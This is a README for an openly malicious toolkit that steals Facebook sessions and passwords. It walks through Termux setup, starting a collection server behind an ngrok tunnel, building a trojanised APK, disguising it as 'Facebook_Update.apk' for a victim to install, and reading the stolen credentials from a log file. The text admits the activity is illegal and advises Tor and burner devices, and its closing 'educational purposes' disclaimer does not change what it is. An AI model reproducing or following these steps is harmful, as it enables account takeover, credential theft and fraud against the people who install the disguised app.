# Facebook Terminator Toolkit 
**Steal Facebook sessions + passwords (rooted devices)**  

⚠️ **WARNING**: Illegal activity. Use Tor/VPN. Burner devices only.  

---

## 🔧 Installation Guide  

### 📲 **Termux Setup**  
1. Install Termux from **[F-Droid](https://f-droid.org/)** (*NOT Google Play*)  
2. Run these commands:  
```bash  
termux-setup-storage  
termux-change-repo  
pkg update -y  
pkg install git wget openjdk-17 unzip -y



### 1️⃣ Install APKTOOL  
```bash  
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool  
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar  
mv apktool_2.9.3.jar apktool.jar  
chmod +x apktool*  
mv apktool* $PREFIX/bin  
```

### 2️⃣ Install Ngrok (For Tunneling)  
```bash  
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz  
tar xvf ngrok-v3-stable-linux-arm.tgz  
chmod +x ngrok  
mv ngrok $PREFIX/bin  
```

### 3️⃣ Android SDK Tools  
```bash  
pkg install aapt dx ecj -y  
```

### 4️⃣ Clone Repository  
```bash  
git clone https://github.com/Veran350/FB_TERMINATOR  
cd FB_TERMINATOR  
mkdir -p server apk_out  
```

---

## 🚀 **Usage**  

### 1️⃣ Prepare Scripts  
```bash  
chmod +x termux/*  
```

### 2️⃣ Start Server & Ngrok  
```bash  
./termux/SERVER_KILLER.sh  
```  
*Wait for Ngrok URL to appear (e.g., `https://abcd.ngrok.io`)*  

### 3️⃣ Build Malicious APK  
```bash  
./termux/AUTO_DEPLOY.sh  
```  
*APK will be in: `apk_out/FB_Signed.apk`*  

### 4️⃣ Share APK with Victim  
```bash  
cp apk_out/FB_Signed.apk /sdcard/Download/Facebook_Update.apk  
```

---

## 📁 **Stolen Data**  
View stolen credentials:  
```bash  
cat server/stolen_data.log  
```

---

## ❓ **FAQ**  
**Q:** Getting "Package not found" errors?  
**A:** Run `termux-change-repo` and select "Mirrors by Grimler"  

**Q:** Ngrok not working?  
**A:** Get auth token from [ngrok.com](https://dashboard.ngrok.com/get-started/your-authtoken) → Run `ngrok config add-authtoken YOUR_TOKEN`  

**Q:** APK fails to install?  
**A:** Enable "Unknown Sources" in victim's phone settings  

---

**⚠️ DISCLAIMER**: This tool is for educational purposes only. I take NO responsibility for your actions.  
``` 
